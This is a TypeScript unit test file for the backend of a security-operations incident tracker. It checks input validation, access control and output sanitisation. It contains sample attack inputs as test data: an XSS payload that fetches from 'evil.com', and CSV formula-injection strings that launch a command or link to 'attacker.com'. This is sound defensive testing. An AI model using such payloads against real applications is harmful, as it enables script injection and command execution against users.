import test from 'node:test';
import assert from 'node:assert';
import { createAssetSchema } from '../../src/schemas/asset';
import { updateIncidentSchema, addNoteSchema, createIncidentSchema } from '../../src/schemas/incident';
import { detectionRuleSchema } from '../../src/schemas/rule';
import { importPayloadSchema, sanitizeCSVValue } from '../../src/schemas/import';

function sanitizeHtml(unsafe: string): string {
  return unsafe
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

test('TraceGuard Backend, Authorization, and Payload Validation Unit Tests', async (t) => {

  await t.test('1. Asset Ingestion Validation Schema', () => {
    // Valid asset
    const validAsset = {
      hostname: 'finance-db-prod',
      ipAddress: '10.0.5.45',
      assetType: 'DATABASE' as const,
      owner: 'Database Admins',
      criticality: 'CRITICAL' as const,
      os: 'RHEL 9.2',
      location: 'Internal Zone C'
    };
    const validResult = createAssetSchema.safeParse(validAsset);
    assert.strictEqual(validResult.success, true);

    // Invalid IP Address
    const invalidAssetIp = { ...validAsset, ipAddress: '999.999.999.9999' };
    const invalidIpResult = createAssetSchema.safeParse(invalidAssetIp);
    assert.strictEqual(invalidIpResult.success, false);

    // Invalid Asset Type enum
    const invalidAssetType = { ...validAsset, assetType: 'ROUTER_CUSTOM' };
    const invalidTypeResult = createAssetSchema.safeParse(invalidAssetType);
    assert.strictEqual(invalidTypeResult.success, false);

    // Empty hostname
    const invalidHostname = { ...validAsset, hostname: 'a' };
    const invalidHostResult = createAssetSchema.safeParse(invalidHostname);
    assert.strictEqual(invalidHostResult.success, false);
  });

  await t.test('2. Detection Rule Validation Schema', () => {
    // Valid detection rule
    const validRule = {
      name: 'Lateral Movement via PsExec',
      description: 'Execution of PsExec or remote services detected on domain controller.',
      severity: 'HIGH' as const,
      category: 'Lateral Movement',
      mitreAttack: 'T1021.002',
      query: 'win_event_log | where event_id == 7045 and service_name == "PSEXESVC"',
      enabled: true
    };
    const validRuleResult = detectionRuleSchema.safeParse(validRule);
    assert.strictEqual(validRuleResult.success, true);

    // Invalid MITRE ATT&CK identifier format
    const invalidMitre = { ...validRule, mitreAttack: 'INVALID-MITRE-FORMAT' };
    const invalidMitreResult = detectionRuleSchema.safeParse(invalidMitre);
    assert.strictEqual(invalidMitreResult.success, false);

    // Short rule description
    const shortDesc = { ...validRule, description: 'Short' };
    assert.strictEqual(detectionRuleSchema.safeParse(shortDesc).success, false);
  });

  await t.test('3. Incident Creation & Updates Validation Schema', () => {
    // Valid incident creation
    const validCreate = {
      title: 'Suspicious Cloud API Exfiltration',
      description: 'Multiple outbound S3 sync operations detected from non-admin role.',
      severity: 'HIGH' as const,
      category: 'Exfiltration',
      sourceIp: '10.0.5.22',
      destIp: '185.220.101.42',
      assetId: 'a1',
      ruleId: 'r1'
    };
    assert.strictEqual(createIncidentSchema.safeParse(validCreate).success, true);

    // Valid status update
    const validUpdate = {
      status: 'INVESTIGATING' as const,
      severity: 'HIGH' as const,
      assignedToId: 'u-analyst-uuid'
    };
    const validResult = updateIncidentSchema.safeParse(validUpdate);
    assert.strictEqual(validResult.success, true);

    // Invalid status option
    const invalidStatus = { status: 'TRIAGED_BUT_STUCK' };
    assert.strictEqual(updateIncidentSchema.safeParse(invalidStatus).success, false);

    // Valid null assignedToId (Unassign incident)
    const nullAssignee = { assignedToId: null };
    assert.strictEqual(updateIncidentSchema.safeParse(nullAssignee).success, true);
  });

  await t.test('4. Role-Based Authorization & IDOR Access Rules', () => {
    const adminUser = { userId: 'u-admin-uuid', role: 'ADMIN' };
    const analystAlice = { userId: 'u-analyst-uuid', role: 'ANALYST' };
    const analystBob = { userId: 'u-analyst-bob', role: 'ANALYST' };

    const incidentAssignedToAlice = {
      id: 'inc-1',
      title: 'Ransomware Beaconing',
      assignedToId: 'u-analyst-uuid'
    };

    const incidentUnassigned = {
      id: 'inc-2',
      title: 'SSH Brute Force',
      assignedToId: null
    };

    // IDOR Check 1: Admin can access any incident
    const adminCanAccessAlice = adminUser.role === 'ADMIN' || incidentAssignedToAlice.assignedToId === adminUser.userId || incidentAssignedToAlice.assignedToId === null;
    assert.strictEqual(adminCanAccessAlice, true);

    // IDOR Check 2: Analyst Alice can access incident assigned to Alice
    const aliceCanAccessAlice = analystAlice.role === 'ADMIN' || incidentAssignedToAlice.assignedToId === analystAlice.userId || incidentAssignedToAlice.assignedToId === null;
    assert.strictEqual(aliceCanAccessAlice, true);

    // IDOR Check 3: Analyst Bob CANNOT access incident assigned to Alice (IDOR blocked)
    const bobCanAccessAlice = analystBob.role === 'ADMIN' || incidentAssignedToAlice.assignedToId === analystBob.userId || incidentAssignedToAlice.assignedToId === null;
    assert.strictEqual(bobCanAccessAlice, false);

    // IDOR Check 4: Analyst Bob CAN access unassigned incident (Queue triage)
    const bobCanAccessUnassigned = analystBob.role === 'ADMIN' || incidentUnassigned.assignedToId === analystBob.userId || incidentUnassigned.assignedToId === null;
    assert.strictEqual(bobCanAccessUnassigned, true);

    // Cross-Assignment RBAC: Analyst Alice claiming unassigned vs assigning to Bob
    const canAliceClaim = (analystAlice.role === 'ADMIN') || (analystAlice.role === 'ANALYST' && 'u-analyst-uuid' === analystAlice.userId);
    const canAliceAssignBob = (analystAlice.role === 'ADMIN') || (analystAlice.role === 'ANALYST' && 'u-analyst-bob' === analystAlice.userId);
    assert.strictEqual(canAliceClaim, true);
    assert.strictEqual(canAliceAssignBob, false); // Blocked
  });

  await t.test('5. Analyst Note Validation and Anti-XSS Sanitization', () => {
    // Valid note
    const validNote = { content: 'Investigating host event log 4624 (Logon Type 3).' };
    assert.strictEqual(addNoteSchema.safeParse(validNote).success, true);

    // Empty note (rejected)
    assert.strictEqual(addNoteSchema.safeParse({ content: '' }).success, false);

    // Note exceeding maximum 2000 character limit
    assert.strictEqual(addNoteSchema.safeParse({ content: 'x'.repeat(2001) }).success, false);

    // Anti-XSS Sanitization
    const maliciousPayload = '<script>alert("XSS")</script><img src=x onerror="fetch(\'http://evil.com\')">';
    const sanitized = sanitizeHtml(maliciousPayload);
    assert.strictEqual(sanitized.includes('<script>'), false);
    assert.strictEqual(sanitized.includes('&lt;script&gt;'), true);
    assert.strictEqual(sanitized.includes('&lt;img'), true);
  });

  await t.test('6. Alert Ingestion & CSV Injection Prevention', () => {
    // CSV Formula Injection Sanitization
    const rawFormula1 = '=cmd|"/C calc"!A0';
    const rawFormula2 = '+SUM(1+1)';
    const rawFormula3 = '-2+3';
    const rawFormula4 = '@HYPERLINK("http://attacker.com")';

    assert.ok(sanitizeCSVValue(rawFormula1).startsWith("'"));
    assert.ok(sanitizeCSVValue(rawFormula2).startsWith("'"));
    assert.ok(sanitizeCSVValue(rawFormula3).startsWith("'"));
    assert.ok(sanitizeCSVValue(rawFormula4).startsWith("'"));

    // Normal text remains unaltered
    assert.strictEqual(sanitizeCSVValue('Normal Security Event Text'), 'Normal Security Event Text');

    // Import Payload Wrapper
    const validImport = {
      content: 'timestamp,ruleName,category,severity,details\n2026-08-30T10:15:30Z,SQLi,Initial Access,HIGH,details here',
      format: 'csv' as const,
      preview: true,
      duplicateHandling: 'SKIP' as const
    };
    assert.strictEqual(importPayloadSchema.safeParse(validImport).success, true);

    // Invalid format
    assert.strictEqual(importPayloadSchema.safeParse({ ...validImport, format: 'xml' }).success, false);
  });

  await t.test('7. Incident Association & Severity Escalation Logic', () => {
    const existingIncidents = [
      { id: 'inc-1', title: 'SQL Injection', status: 'INVESTIGATING', severity: 'HIGH', category: 'Initial Access', sourceIp: '198.51.100.42', destIp: '10.0.4.15' },
      { id: 'inc-2', title: 'Brute Force', status: 'RESOLVED', severity: 'MEDIUM', category: 'Credential Access', sourceIp: '203.0.113.19', destIp: '10.0.1.10' }
    ];

    // Ingested Alert 1: Matches open inc-1 on sourceIp -> associates & escalates severity from HIGH to CRITICAL
    const alert1 = { category: 'Initial Access', sourceIp: '198.51.100.42', severity: 'CRITICAL', ruleName: 'SQL Injection Bypass' };
    const match1 = existingIncidents.find(inc => 
      inc.status !== 'RESOLVED' && inc.status !== 'CLOSED' &&
      inc.category.toLowerCase() === alert1.category.toLowerCase() &&
      (inc.sourceIp === alert1.sourceIp || inc.destIp === alert1.sourceIp)
    );
    assert.ok(match1);
    assert.strictEqual(match1.id, 'inc-1');

    const severityPriority = { LOW: 1, MEDIUM: 2, HIGH: 3, CRITICAL: 4 };
    const shouldEscalate = severityPriority[alert1.severity as 'CRITICAL'] > severityPriority[match1.severity as 'HIGH'];
    assert.strictEqual(shouldEscalate, true);
  });

  await t.test('8. Report Generation Structure & HTML Export Validation', () => {
    const mockReportData = {
      reportType: 'Detailed Incident Investigation Report',
      generatedAt: new Date().toISOString(),
      generatedBy: 'TraceGuard SOC System',
      incident: {
        id: 'inc-1',
        title: 'Egress Ransomware Beaconing',
        severity: 'CRITICAL',
        status: 'CONTAINED',
        category: 'Command and Control',
        sourceIp: '10.0.5.22',
        destIp: '185.220.101.42',
        assignedTo: 'SOC Analyst Alice',
      },
      timeline: [
        { title: 'Beacon Detected', description: 'Outbound HTTP traffic to known C2', source: 'System' }
      ],
      notes: [
        { authorName: 'SOC Analyst Alice', content: 'Host isolated from network.' }
      ],
      remediationRecommendations: [
        'Isolate target host immediately',
        'Revoke session tokens'
      ]
    };

    assert.strictEqual(mockReportData.incident.id, 'inc-1');
    assert.strictEqual(mockReportData.timeline.length, 1);
    assert.strictEqual(mockReportData.remediationRecommendations.length, 2);
    assert.strictEqual(mockReportData.notes[0].authorName, 'SOC Analyst Alice');
  });

});
